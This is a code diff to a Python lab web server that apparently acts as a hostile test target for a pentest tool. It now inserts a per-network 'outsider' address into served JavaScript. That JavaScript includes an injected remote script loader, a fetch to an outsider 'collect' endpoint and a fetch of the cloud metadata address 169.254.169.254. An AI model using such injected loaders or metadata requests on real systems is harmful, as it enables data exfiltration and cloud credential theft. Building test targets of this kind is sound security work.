@@ -135,7 +135,7 @@ const api = {
 };
 const routes = [{ path: '/admin/dashboard', component: 'AdminDashboard' }];
 (function(){ var s=document.createElement('script'); s.src='http://OUTSIDER/widget.js'; document.head.appendChild(s); })();
-""".replace("OUTSIDER", OUTSIDER)
+"""
 
 OPENAPI = {
     "openapi": "3.0.3",
@@ -201,7 +201,7 @@ fetch('/rate/internal/a'); fetch('/rate/internal/b'); fetch('/rate/internal/c');
 fetch('/reset-conn'); fetch('/xss-snippet');
 fetch('/internal/caf%C3%A9'); fetch('/internal/a/../b'); fetch('/internal/LONGSEG');
 fetch('http://OUTSIDER/api/internal/collect'); fetch('http://169.254.169.254/latest/meta-data/');
-""".replace("OUTSIDER", OUTSIDER).replace("LONGSEG", "x" * 2000)
+""".replace("LONGSEG", "x" * 2000)
 
 
 def _hostile_openapi() -> dict:
@@ -250,6 +250,15 @@ class Handler(BaseHTTPRequestHandler):
             entry["header_names"] = sorted(k.lower() for k in h.keys())
         with _LOCK, open(HITS, "a") as fh:
             fh.write(json.dumps(entry) + "\n")
+
+    def _outsider_ip(self) -> str:
+        """The outsider's address on the network this request came in on. The lab
+        answers on redamon-network and on pentest-net at the same last octets, and
+        a browser behind the capture proxy reaches only the pentest-net one."""
+        local = self.connection.getsockname()[0]
+        if local.count(".") == 3 and not local.startswith("127."):
+            return local.rsplit(".", 1)[0] + ".96"
+        return OUTSIDER
 
     def _send(self, status: int, body: bytes | str = b"", ctype: str = "text/html; charset=utf-8",
               headers: dict | None = None) -> None:
@@ -349,7 +358,7 @@ class Handler(BaseHTTPRequestHandler):
             uploads = '<p><a href="/uploads/invoice-1001.pdf">Your invoice</a></p>' if authed else ""
             return self._send(200, LANDING.format(uploads=uploads))
         if path == "/static/app.js":
-            return self._send(200, APP_JS, "application/javascript")
+            return self._send(200, APP_JS.replace("OUTSIDER", self._outsider_ip()), "application/javascript")
         if path == "/openapi.json":
             return self._json(200, OPENAPI)
         if path == "/login":
@@ -447,7 +456,7 @@ class Handler(BaseHTTPRequestHandler):
         if path == "/profile":
             if not authed:
                 return self._send(302, "", headers={"Location": "/login"})
-            return self._send(200, f'<html><head><title>Profile</title><script src="http://{OUTSIDER}/widget.js">'
+            return self._send(200, f'<html><head><title>Profile</title><script src="http://{self._outsider_ip()}/widget.js">'
                                    '</script></head><body><h1>Your profile</h1><p>Name: Lab User 1</p>'
                                    '<p>Email: user1@lab.invalid</p></body></html>')
         return self._send(404, "<html><head><title>404 Not Found</title></head><body>Not found</body></html>")
@@ -477,7 +486,7 @@ class Handler(BaseHTTPRequestHandler):
         if path == "/" or path.startswith("/spa/"):
             return self._send(200, SPA_SHELL)
         if path == "/static/hostile.js":
-            return self._send(200, HOSTILE_JS, "application/javascript")
+            return self._send(200, HOSTILE_JS.replace("OUTSIDER", self._outsider_ip()), "application/javascript")
         if path == "/openapi.json":
             return self._send(200, HOSTILE_OPENAPI, "application/json")
         if path.startswith("/api/missing/"):
